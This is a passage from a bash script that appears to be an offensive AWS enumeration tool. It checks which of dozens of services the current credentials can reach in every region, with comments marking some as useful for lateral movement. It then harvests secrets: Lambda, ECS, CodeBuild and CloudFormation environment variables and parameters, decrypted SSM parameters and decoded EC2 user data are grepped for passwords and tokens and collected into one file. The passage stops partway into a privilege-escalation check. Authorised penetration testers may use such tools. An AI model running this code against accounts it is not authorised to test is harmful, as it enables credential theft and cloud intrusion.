        test_service_all_regions "ACM (List Certificates)" "aws acm list-certificates --region {REGION}" "acm_certificates.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # EKS - Kubernetes clusters
    if should_test_service "eks"; then
        echo ""
        test_service_all_regions "EKS (List Clusters)" "aws eks list-clusters --region {REGION}" "eks_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # ElastiCache - Redis/Memcached
    if should_test_service "elasticache"; then
        echo ""
        test_service_all_regions "ElastiCache (Describe Clusters)" "aws elasticache describe-cache-clusters --region {REGION}" "elasticache_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # OpenSearch/Elasticsearch
    if should_test_service "opensearch"; then
        echo ""
        test_service_all_regions "OpenSearch (List Domains)" "aws opensearch list-domain-names --region {REGION}" "opensearch_domains.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Redshift - Data warehouses
    if should_test_service "redshift"; then
        echo ""
        test_service_all_regions "Redshift (Describe Clusters)" "aws redshift describe-clusters --region {REGION}" "redshift_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CodeCommit - Source code repositories
    if should_test_service "codecommit"; then
        echo ""
        test_service_all_regions "CodeCommit (List Repositories)" "aws codecommit list-repositories --region {REGION}" "codecommit_repos.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CodeBuild - Build projects
    if should_test_service "codebuild"; then
        echo ""
        test_service_all_regions "CodeBuild (List Projects)" "aws codebuild list-projects --region {REGION}" "codebuild_projects.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CodePipeline - CI/CD pipelines
    if should_test_service "codepipeline"; then
        echo ""
        test_service_all_regions "CodePipeline (List Pipelines)" "aws codepipeline list-pipelines --region {REGION}" "codepipeline_pipelines.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Step Functions - State machines
    if should_test_service "stepfunctions"; then
        echo ""
        test_service_all_regions "Step Functions (List State Machines)" "aws stepfunctions list-state-machines --region {REGION}" "stepfunctions_machines.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # EventBridge - Event rules
    if should_test_service "eventbridge"; then
        echo ""
        test_service_all_regions "EventBridge (List Rules)" "aws events list-rules --region {REGION}" "eventbridge_rules.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Firehose - Data delivery streams
    if should_test_service "firehose"; then
        echo ""
        test_service_all_regions "Firehose (List Delivery Streams)" "aws firehose list-delivery-streams --region {REGION}" "firehose_streams.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # AppSync - GraphQL APIs
    if should_test_service "appsync"; then
        echo ""
        test_service_all_regions "AppSync (List GraphQL APIs)" "aws appsync list-graphql-apis --region {REGION}" "appsync_apis.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Amplify - Web applications
    if should_test_service "amplify"; then
        echo ""
        test_service_all_regions "Amplify (List Apps)" "aws amplify list-apps --region {REGION}" "amplify_apps.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SageMaker - ML notebooks and models
    if should_test_service "sagemaker"; then
        echo ""
        test_service_all_regions "SageMaker (List Notebooks)" "aws sagemaker list-notebook-instances --region {REGION}" "sagemaker_notebooks.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # EMR - Big data clusters
    if should_test_service "emr"; then
        echo ""
        test_service_all_regions "EMR (List Clusters)" "aws emr list-clusters --active --region {REGION}" "emr_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Batch - Batch computing
    if should_test_service "batch"; then
        echo ""
        test_service_all_regions "Batch (Describe Compute Environments)" "aws batch describe-compute-environments --region {REGION}" "batch_environments.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # IoT - IoT devices and policies
    if should_test_service "iot"; then
        echo ""
        test_service_all_regions "IoT (List Things)" "aws iot list-things --region {REGION}" "iot_things.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Transfer Family - SFTP servers
    if should_test_service "transfer"; then
        echo ""
        test_service_all_regions "Transfer (List Servers)" "aws transfer list-servers --region {REGION}" "transfer_servers.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # MQ - Message brokers
    if should_test_service "mq"; then
        echo ""
        test_service_all_regions "MQ (List Brokers)" "aws mq list-brokers --region {REGION}" "mq_brokers.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # DocumentDB
    if should_test_service "documentdb"; then
        echo ""
        test_service_all_regions "DocumentDB (Describe Clusters)" "aws docdb describe-db-clusters --region {REGION}" "documentdb_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Neptune - Graph database
    if should_test_service "neptune"; then
        echo ""
        test_service_all_regions "Neptune (Describe Clusters)" "aws neptune describe-db-clusters --region {REGION}" "neptune_clusters.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # EFS - Elastic File System
    if should_test_service "efs"; then
        echo ""
        test_service_all_regions "EFS (Describe File Systems)" "aws efs describe-file-systems --region {REGION}" "efs_filesystems.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # FSx - File systems
    if should_test_service "fsx"; then
        echo ""
        test_service_all_regions "FSx (Describe File Systems)" "aws fsx describe-file-systems --region {REGION}" "fsx_filesystems.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Backup - AWS Backup vaults
    if should_test_service "backup"; then
        echo ""
        test_service_all_regions "Backup (List Backup Vaults)" "aws backup list-backup-vaults --region {REGION}" "backup_vaults.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SES - Email service
    if should_test_service "ses"; then
        echo ""
        test_service_all_regions "SES (List Identities)" "aws ses list-identities --region {REGION}" "ses_identities.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # WAF Regional - Web ACLs
    if should_test_service "wafv2"; then
        echo ""
        test_service_all_regions "WAFv2 Regional (List Web ACLs)" "aws wafv2 list-web-acls --scope REGIONAL --region {REGION}" "wafv2_regional_webacls.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Elastic Beanstalk - Applications
    if should_test_service "elasticbeanstalk"; then
        echo ""
        test_service_all_regions "Elastic Beanstalk (Describe Applications)" "aws elasticbeanstalk describe-applications --region {REGION}" "elasticbeanstalk_apps.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Lightsail - Simplified compute
    if should_test_service "lightsail"; then
        echo ""
        test_service_all_regions "Lightsail (Get Instances)" "aws lightsail get-instances --region {REGION}" "lightsail_instances.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # Security & Compliance Services (valuable for understanding security posture)
    #===========================================================================
    
    print_section "TESTING SECURITY & COMPLIANCE SERVICES"
    
    # GuardDuty - Threat findings (Regional)
    if should_test_service "guardduty"; then
        echo ""
        test_service_all_regions "GuardDuty (List Detectors)" "aws guardduty list-detectors --region {REGION}" "guardduty_detectors.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # SecurityHub - Security findings (Regional)
    if should_test_service "securityhub"; then
        echo ""
        test_service_all_regions "SecurityHub (Get Findings)" "aws securityhub get-findings --max-items 50 --region {REGION}" "securityhub_findings.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Inspector - Vulnerability findings (Regional)
    if should_test_service "inspector"; then
        echo ""
        test_service_all_regions "Inspector2 (List Findings)" "aws inspector2 list-findings --max-results 50 --region {REGION}" "inspector_findings.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Macie - Sensitive data findings (Regional)
    if should_test_service "macie"; then
        echo ""
        test_service_all_regions "Macie2 (List Findings)" "aws macie2 list-findings --region {REGION}" "macie_findings.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Config - AWS Config rules (Regional)
    if should_test_service "config"; then
        echo ""
        test_service_all_regions "Config (Describe Config Rules)" "aws configservice describe-config-rules --region {REGION}" "config_rules.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # CloudTrail - Audit trails (Regional but can be multi-region trails)
    if should_test_service "cloudtrail"; then
        echo ""
        test_service_all_regions "CloudTrail (Describe Trails)" "aws cloudtrail describe-trails --region {REGION}" "cloudtrail_trails.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # RAM - Resource Access Manager (Regional)
    if should_test_service "ram"; then
        echo ""
        test_service_all_regions "RAM (List Resources)" "aws ram list-resources --resource-owner SELF --region {REGION}" "ram_resources.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # Network Services (valuable for lateral movement)
    #===========================================================================
    
    print_section "TESTING NETWORK SERVICES"
    
    # VPC - Virtual Private Clouds
    if should_test_service "vpc"; then
        echo ""
        test_service_all_regions "VPC (Describe VPCs)" "aws ec2 describe-vpcs --region {REGION}" "vpcs.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Security Groups - Firewall rules
    if should_test_service "security-groups"; then
        echo ""
        test_service_all_regions "Security Groups (Describe)" "aws ec2 describe-security-groups --region {REGION}" "security_groups.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Subnets
    if should_test_service "subnets"; then
        echo ""
        test_service_all_regions "Subnets (Describe)" "aws ec2 describe-subnets --region {REGION}" "subnets.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # VPC Endpoints - Private connectivity
    if should_test_service "vpc-endpoints"; then
        echo ""
        test_service_all_regions "VPC Endpoints (Describe)" "aws ec2 describe-vpc-endpoints --region {REGION}" "vpc_endpoints.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Network ACLs
    if should_test_service "network-acls"; then
        echo ""
        test_service_all_regions "Network ACLs (Describe)" "aws ec2 describe-network-acls --region {REGION}" "network_acls.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # NAT Gateways
    if should_test_service "nat-gateways"; then
        echo ""
        test_service_all_regions "NAT Gateways (Describe)" "aws ec2 describe-nat-gateways --region {REGION}" "nat_gateways.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Internet Gateways
    if should_test_service "internet-gateways"; then
        echo ""
        test_service_all_regions "Internet Gateways (Describe)" "aws ec2 describe-internet-gateways --region {REGION}" "internet_gateways.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # VPN Connections
    if should_test_service "vpn"; then
        echo ""
        test_service_all_regions "VPN Connections (Describe)" "aws ec2 describe-vpn-connections --region {REGION}" "vpn_connections.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Direct Connect
    if should_test_service "directconnect"; then
        echo ""
        test_service_all_regions "Direct Connect (Describe Connections)" "aws directconnect describe-connections --region {REGION}" "directconnect.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Elastic Load Balancers
    if should_test_service "elb"; then
        echo ""
        test_service_all_regions "ELBv2 (Describe Load Balancers)" "aws elbv2 describe-load-balancers --region {REGION}" "load_balancers.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Target Groups
    if should_test_service "target-groups"; then
        echo ""
        test_service_all_regions "ELBv2 (Describe Target Groups)" "aws elbv2 describe-target-groups --region {REGION}" "target_groups.json" && ((findings++)) || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # Cost & Billing (can reveal organizational info)
    #===========================================================================
    
    print_section "TESTING BILLING & COST SERVICES"
    
    # Cost Explorer
    if should_test_service "cost-explorer"; then
        echo ""
        test_service "Cost Explorer (Get Cost and Usage)" "aws ce get-cost-and-usage --time-period Start=$(date -d '30 days ago' +%Y-%m-%d 2>/dev/null || date -v-30d +%Y-%m-%d),End=$(date +%Y-%m-%d) --granularity MONTHLY --metrics BlendedCost" "cost_usage.json" && ((findings++)) || true || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    # Budgets
    if should_test_service "budgets"; then
        echo ""
        test_service "Budgets (Describe Budgets)" "aws budgets describe-budgets --account-id $ACCOUNT_ID" "budgets.json" && ((findings++)) || true || true
        ((tested_count++))
    else
        ((skipped_count++))
    fi
    
    #===========================================================================
    # Summary
    #===========================================================================
    echo ""
    if [ -n "$SERVICES_TO_TEST" ]; then
        print_info "Service enumeration complete. Tested $tested_count services, skipped $skipped_count."
    else
        print_info "Service enumeration complete. Tested $tested_count services."
    fi
    print_info "Found access to $findings services."
    return 0
}

extract_sensitive_data() {
    print_section "EXTRACTING SENSITIVE DATA"
    
    # Patterns to search for (common secret patterns)
    SECRET_PATTERNS="password|secret|key|token|credential|api_key|apikey|auth|private|cert|jdbc|connection.*string|mysql|postgres|mongodb|redis|aws_access|aws_secret"
    
    #===========================================================================
    # Lambda Environment Variables (handles multi-region files)
    #===========================================================================
    lambda_files=("$OUTPUT_DIR"/lambda_functions*.json)
    if [ -f "${lambda_files[0]}" ]; then
        print_info "Extracting Lambda environment variables from all regions..."
        
        for lambda_file in "$OUTPUT_DIR"/lambda_functions*.json; do
            [ -f "$lambda_file" ] || continue
            region=$(echo "$lambda_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="default"
            
            jq -r '.Functions[] | select(.Environment != null) | 
                "\n=== \(.FunctionName) ['"$region"'] ===\n" + 
                (.Environment.Variables | to_entries[] | "\(.key): \(.value)")' \
                "$lambda_file" 2>/dev/null >> "$OUTPUT_DIR/all_env_vars.txt" || true
        done
        
        print_info "Searching for secrets in Lambda env vars..."
        grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/all_env_vars.txt" 2>/dev/null | head -100 > "$OUTPUT_DIR/lambda_secrets.txt" || true
        
        if [ -s "$OUTPUT_DIR/lambda_secrets.txt" ]; then
            secret_count=$(wc -l < "$OUTPUT_DIR/lambda_secrets.txt")
            print_finding "Found $secret_count potential secrets in Lambda environment variables!"
        fi
    fi
    
    #===========================================================================
    # CodeBuild Environment Variables (handles multi-region files)
    #===========================================================================
    codebuild_files=("$OUTPUT_DIR"/codebuild_projects*.json)
    if [ -f "${codebuild_files[0]}" ]; then
        print_info "Extracting CodeBuild project details from all regions..."
        
        for cb_file in "$OUTPUT_DIR"/codebuild_projects*.json; do
            [ -f "$cb_file" ] || continue
            region=$(echo "$cb_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="$AWS_REGION"
            
            projects=$(jq -r '.projects[]? // empty' "$cb_file" 2>/dev/null)
            [ -z "$projects" ] && continue
            
            while IFS= read -r project; do
                [ -z "$project" ] && continue
                project_detail=$(aws codebuild batch-get-projects --names "$project" --region "$region" 2>/dev/null) || true
                [ -n "$project_detail" ] && echo "$project_detail" >> "$OUTPUT_DIR/codebuild_details.json"
            done <<< "$projects"
        done
        
        if [ -f "$OUTPUT_DIR/codebuild_details.json" ]; then
            grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/codebuild_details.json" 2>/dev/null > "$OUTPUT_DIR/codebuild_secrets.txt" || true
            
            if [ -s "$OUTPUT_DIR/codebuild_secrets.txt" ]; then
                print_finding "Found potential secrets in CodeBuild projects!"
            fi
        fi
    fi
    
    #===========================================================================
    # CloudFormation Stack Parameters (handles multi-region files)
    #===========================================================================
    cfn_files=("$OUTPUT_DIR"/cloudformation_stacks*.json)
    if [ -f "${cfn_files[0]}" ]; then
        print_info "Extracting CloudFormation stack parameters from all regions..."
        
        for cfn_file in "$OUTPUT_DIR"/cloudformation_stacks*.json; do
            [ -f "$cfn_file" ] || continue
            region=$(echo "$cfn_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="$AWS_REGION"
            
            stack_names=$(jq -r '.StackSummaries[].StackName // empty' "$cfn_file" 2>/dev/null | head -20)
            [ -z "$stack_names" ] && continue
            
            while IFS= read -r stack_name; do
                [ -z "$stack_name" ] && continue
                stack_detail=$(aws cloudformation describe-stacks --stack-name "$stack_name" --region "$region" 2>/dev/null) || true
                [ -n "$stack_detail" ] && echo "$stack_detail" >> "$OUTPUT_DIR/cloudformation_details.json"
            done <<< "$stack_names"
        done
        
        if [ -f "$OUTPUT_DIR/cloudformation_details.json" ]; then
            jq -r '.Stacks[].Parameters[]? | "\(.ParameterKey): \(.ParameterValue)"' "$OUTPUT_DIR/cloudformation_details.json" 2>/dev/null > "$OUTPUT_DIR/cloudformation_params.txt" || true
            
            grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/cloudformation_params.txt" 2>/dev/null > "$OUTPUT_DIR/cloudformation_secrets.txt" || true
            
            if [ -s "$OUTPUT_DIR/cloudformation_secrets.txt" ]; then
                print_finding "Found potential secrets in CloudFormation parameters!"
            fi
        fi
    fi
    
    #===========================================================================
    # SSM Parameters (attempt to get values - handles multi-region)
    #===========================================================================
    ssm_files=("$OUTPUT_DIR"/ssm_parameters*.json)
    if [ -f "${ssm_files[0]}" ]; then
        print_info "Attempting to read SSM parameter values from all regions..."
        
        for ssm_file in "$OUTPUT_DIR"/ssm_parameters*.json; do
            [ -f "$ssm_file" ] || continue
            region=$(echo "$ssm_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="$AWS_REGION"
            
            param_names=$(jq -r '.Parameters[].Name // empty' "$ssm_file" 2>/dev/null | head -30)
            [ -z "$param_names" ] && continue
            
            while IFS= read -r param_name; do
                [ -z "$param_name" ] && continue
                echo -n "  Reading $param_name ($region)... "
                param_value=$(aws ssm get-parameter --name "$param_name" --with-decryption --region "$region" 2>/dev/null) || true
                if [ -n "$param_value" ]; then
                    echo "$param_value" >> "$OUTPUT_DIR/ssm_values.json"
                    print_success "Retrieved"
                else
                    print_error "Access denied or encrypted"
                fi
            done <<< "$param_names"
        done
        
        if [ -f "$OUTPUT_DIR/ssm_values.json" ]; then
            grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/ssm_values.json" 2>/dev/null > "$OUTPUT_DIR/ssm_secrets.txt" || true
        fi
    fi
    
    #===========================================================================
    # ECS Task Definitions (contain environment variables - multi-region)
    #===========================================================================
    ecs_files=("$OUTPUT_DIR"/ecs_clusters*.json)
    if [ -f "${ecs_files[0]}" ]; then
        print_info "Extracting ECS task definitions from all regions..."
        
        for ecs_file in "$OUTPUT_DIR"/ecs_clusters*.json; do
            [ -f "$ecs_file" ] || continue
            region=$(echo "$ecs_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="$AWS_REGION"
            
            task_defs=$(aws ecs list-task-definitions --region "$region" 2>/dev/null) || true
            if [ -n "$task_defs" ]; then
                echo "$task_defs" >> "$OUTPUT_DIR/ecs_task_definitions.json"
                
                task_arns=$(echo "$task_defs" | jq -r '.taskDefinitionArns[]? // empty' 2>/dev/null | head -20)
                if [ -n "$task_arns" ]; then
                    while IFS= read -r task_def; do
                        [ -z "$task_def" ] && continue
                        task_detail=$(aws ecs describe-task-definition --task-definition "$task_def" --region "$region" 2>/dev/null) || true
                        [ -n "$task_detail" ] && echo "$task_detail" >> "$OUTPUT_DIR/ecs_task_details.json"
                    done <<< "$task_arns"
                fi
            fi
        done
        
        if [ -f "$OUTPUT_DIR/ecs_task_details.json" ]; then
            jq -r '.taskDefinition.containerDefinitions[]?.environment[]? | "\(.name): \(.value)"' "$OUTPUT_DIR/ecs_task_details.json" 2>/dev/null > "$OUTPUT_DIR/ecs_env_vars.txt" || true
            
            grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/ecs_env_vars.txt" 2>/dev/null > "$OUTPUT_DIR/ecs_secrets.txt" || true
            
            if [ -s "$OUTPUT_DIR/ecs_secrets.txt" ]; then
                print_finding "Found potential secrets in ECS task definitions!"
            fi
        fi
    fi
    
    #===========================================================================
    # EC2 User Data (often contains bootstrap secrets - multi-region)
    #===========================================================================
    ec2_files=("$OUTPUT_DIR"/ec2_instances*.json)
    if [ -f "${ec2_files[0]}" ]; then
        print_info "Attempting to retrieve EC2 user data from all regions..."
        
        for ec2_file in "$OUTPUT_DIR"/ec2_instances*.json; do
            [ -f "$ec2_file" ] || continue
            region=$(echo "$ec2_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="$AWS_REGION"
            
            instance_ids=$(jq -r '.Reservations[].Instances[].InstanceId // empty' "$ec2_file" 2>/dev/null | head -10)
            [ -z "$instance_ids" ] && continue
            
            while IFS= read -r instance_id; do
                [ -z "$instance_id" ] && continue
                echo -n "  Getting user data for $instance_id ($region)... "
                user_data=$(aws ec2 describe-instance-attribute --instance-id "$instance_id" --attribute userData --region "$region" 2>/dev/null) || true
                if [ -n "$user_data" ]; then
                    decoded=$(echo "$user_data" | jq -r '.UserData.Value // empty' 2>/dev/null | base64 -d 2>/dev/null) || true
                    if [ -n "$decoded" ]; then
                        echo -e "\n=== $instance_id [$region] ===\n$decoded" >> "$OUTPUT_DIR/ec2_userdata.txt"
                        print_success "Retrieved"
                    else
                        print_info "Empty or no user data"
                    fi
                else
                    print_error "Access denied"
                fi
            done <<< "$instance_ids"
        done
        
        if [ -f "$OUTPUT_DIR/ec2_userdata.txt" ]; then
            grep -iE "$SECRET_PATTERNS" "$OUTPUT_DIR/ec2_userdata.txt" 2>/dev/null > "$OUTPUT_DIR/ec2_userdata_secrets.txt" || true
            
            if [ -s "$OUTPUT_DIR/ec2_userdata_secrets.txt" ]; then
                print_finding "Found potential secrets in EC2 user data!"
            fi
        fi
    fi
    
    #===========================================================================
    # RDS Snapshots (check for public snapshots - multi-region)
    #===========================================================================
    print_info "Checking for public RDS snapshots in all regions..."
    
    if [ "$MULTI_REGION" = true ] && [ ${#ALL_REGIONS[@]} -gt 0 ]; then
        for region in "${ALL_REGIONS[@]}"; do
            public_snapshots=$(aws rds describe-db-snapshots --snapshot-type public --region "$region" 2>/dev/null) || true
            if [ -n "$public_snapshots" ]; then
                snapshot_count=$(echo "$public_snapshots" | jq '.DBSnapshots | length' 2>/dev/null)
                if [ "$snapshot_count" != "0" ] && [ -n "$snapshot_count" ] && [ "$snapshot_count" != "null" ]; then
                    echo "$public_snapshots" >> "$OUTPUT_DIR/rds_public_snapshots.json"
                    print_finding "Found $snapshot_count public RDS snapshots in $region!"
                fi
            fi
        done
    else
        if public_snapshots=$(aws rds describe-db-snapshots --snapshot-type public 2>&1); then
            echo "$public_snapshots" > "$OUTPUT_DIR/rds_public_snapshots.json"
            snapshot_count=$(echo "$public_snapshots" | jq '.DBSnapshots | length' 2>/dev/null)
            if [ "$snapshot_count" != "0" ] && [ -n "$snapshot_count" ]; then
                print_finding "Found $snapshot_count public RDS snapshots!"
            fi
        fi
    fi
    
    #===========================================================================
    # S3 Bucket Policies (check for public access) - SKIP IN QUICK MODE
    #===========================================================================
    if [ -f "$OUTPUT_DIR/s3_buckets.txt" ] && [ "$QUICK_MODE" != true ]; then
        print_info "Checking S3 bucket policies for public access (first 30 buckets)..."
        
        bucket_list=$(awk '{print $3}' "$OUTPUT_DIR/s3_buckets.txt" 2>/dev/null | head -30)
        if [ -n "$bucket_list" ]; then
            while IFS= read -r bucket; do
                [ -z "$bucket" ] && continue
                policy=$(aws s3api get-bucket-policy --bucket "$bucket" 2>/dev/null) || true
                if [ -n "$policy" ] && echo "$policy" | grep -q '"Principal".*"\*"'; then
                    print_finding "Bucket $bucket has public access policy!"
                    echo "$bucket: PUBLIC" >> "$OUTPUT_DIR/s3_public_buckets.txt"
                fi
                
                # Check for public ACLs
                acl=$(aws s3api get-bucket-acl --bucket "$bucket" 2>/dev/null) || true
                if [ -n "$acl" ] && echo "$acl" | grep -q "AllUsers\|AuthenticatedUsers"; then
                    print_finding "Bucket $bucket has public ACL!"
                    echo "$bucket: PUBLIC ACL" >> "$OUTPUT_DIR/s3_public_buckets.txt"
                fi
            done <<< "$bucket_list"
        fi
    elif [ "$QUICK_MODE" = true ]; then
        print_info "Skipping S3 policy checks in quick mode"
    fi
    
    #===========================================================================
    # Security Group Rules (check for 0.0.0.0/0 ingress - multi-region)
    #===========================================================================
    sg_files=("$OUTPUT_DIR"/security_groups*.json)
    if [ -f "${sg_files[0]}" ]; then
        print_info "Checking security groups for overly permissive rules in all regions..."
        
        for sg_file in "$OUTPUT_DIR"/security_groups*.json; do
            [ -f "$sg_file" ] || continue
            region=$(echo "$sg_file" | grep -oE '[a-z]{2}-[a-z]+-[0-9]+' | tail -1)
            [ -z "$region" ] && region="default"
            
            jq -r '.SecurityGroups[] | select(.IpPermissions[]?.IpRanges[]?.CidrIp == "0.0.0.0/0") | 
                "\(.GroupId) (\(.GroupName)) ['"$region"']: Open to 0.0.0.0/0"' \
                "$sg_file" 2>/dev/null >> "$OUTPUT_DIR/open_security_groups.txt" || true
        done
        
        if [ -s "$OUTPUT_DIR/open_security_groups.txt" ]; then
            sg_count=$(wc -l < "$OUTPUT_DIR/open_security_groups.txt")
            print_finding "Found $sg_count security groups open to 0.0.0.0/0 across all regions!"
        fi
    fi
    
    #===========================================================================
    # Consolidate All Secrets Found
    #===========================================================================
    print_info "Consolidating all discovered secrets..."
    
    cat "$OUTPUT_DIR"/*_secrets.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt" || true
    
    if [ -s "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt" ]; then
        total_secrets=$(wc -l < "$OUTPUT_DIR/ALL_SECRETS_FOUND.txt")
        print_finding "TOTAL: Found $total_secrets unique potential secrets across all services!"
    fi
    
    print_success "Sensitive data extraction complete"
}

check_privilege_escalation() {
    print_section "CHECKING FOR PRIVILEGE ESCALATION PATHS"
    
    local privesc_findings=0
    
    #===========================================================================
    # Get Current User/Role Policies
    #===========================================================================
    print_info "Analyzing current principal's permissions..."
    
    # Get the current identity type
    current_arn=$(cat "$OUTPUT_DIR/caller_identity.json" 2>/dev/null | jq -r '.Arn')
    
    if [[ "$current_arn" == *":user/"* ]]; then
        # It's an IAM user
        username=$(echo "$current_arn" | sed 's/.*:user\///')
        print_info "Principal is IAM User: $username"
        
        # Get user policies
        echo -n "  Getting attached policies... "
        attached=$(aws iam list-attached-user-policies --user-name "$username" 2>/dev/null) || true
        if [ -n "$attached" ]; then
            echo "$attached" > "$OUTPUT_DIR/user_attached_policies.json"
            print_success "Retrieved"
            
            # Get policy details (skip in quick mode)
            if [ "$QUICK_MODE" != true ]; then
                policy_arns=$(echo "$attached" | jq -r '.AttachedPolicies[].PolicyArn // empty' 2>/dev/null)
                if [ -n "$policy_arns" ]; then
                    while IFS= read -r policy_arn; do
                        [ -z "$policy_arn" ] && continue
                        policy_version=$(aws iam get-policy --policy-arn "$policy_arn" 2>/dev/null | jq -r '.Policy.DefaultVersionId // empty' 2>/dev/null) || true
                        [ -n "$policy_version" ] && aws iam get-policy-version --policy-arn "$policy_arn" --version-id "$policy_version" 2>/dev/null >> "$OUTPUT_DIR/user_policy_details.json" || true
                    done <<< "$policy_arns"
                fi
            fi
        else
            print_error "Access denied"
        fi
        
        # Get inline policies
        echo -n "  Getting inline policies... "
        inline=$(aws iam list-user-policies --user-name "$username" 2>/dev/null) || true
        if [ -n "$inline" ]; then
            echo "$inline" > "$OUTPUT_DIR/user_inline_policies.json"
            print_success "Retrieved"
        else
            print_error "Access denied"
        fi
        
        # Get group memberships
        echo -n "  Getting group memberships... "
        groups=$(aws iam list-groups-for-user --user-name "$username" 2>/dev/null) || true
        if [ -n "$groups" ]; then
            echo "$groups" > "$OUTPUT_DIR/user_groups.json"
            print_success "Retrieved"
            
            # Get policies for each group (skip in quick mode)
            if [ "$QUICK_MODE" != true ]; then
                group_names=$(echo "$groups" | jq -r '.Groups[].GroupName // empty' 2>/dev/null)
                if [ -n "$group_names" ]; then
                    while IFS= read -r group; do
                        [ -z "$group" ] && continue
                        aws iam list-attached-group-policies --group-name "$group" 2>/dev/null >> "$OUTPUT_DIR/group_policies.json" || true
                    done <<< "$group_names"
                fi
            fi
        else
            print_error "Access denied"
        fi
    fi
    
    #===========================================================================
    # Check Dangerous Permissions
    #===========================================================================
    print_info "Checking for dangerous IAM permissions..."
    
    # These permissions can lead to privilege escalation
    dangerous_actions=(
        "iam:CreateUser"
        "iam:CreateRole"
        "iam:CreatePolicy"
        "iam:AttachUserPolicy"
        "iam:AttachRolePolicy"
        "iam:PutUserPolicy"
        "iam:PutRolePolicy"
        "iam:CreateAccessKey"
        "iam:CreateLoginProfile"
        "iam:UpdateAssumeRolePolicy"
        "iam:PassRole"
        "sts:AssumeRole"
        "lambda:CreateFunction"
        "lambda:UpdateFunctionCode"
        "ec2:RunInstances"
        "cloudformation:CreateStack"
        "glue:CreateDevEndpoint"
        "datapipeline:CreatePipeline"
        "sagemaker:CreateNotebookInstance"
    )
    
    echo ""
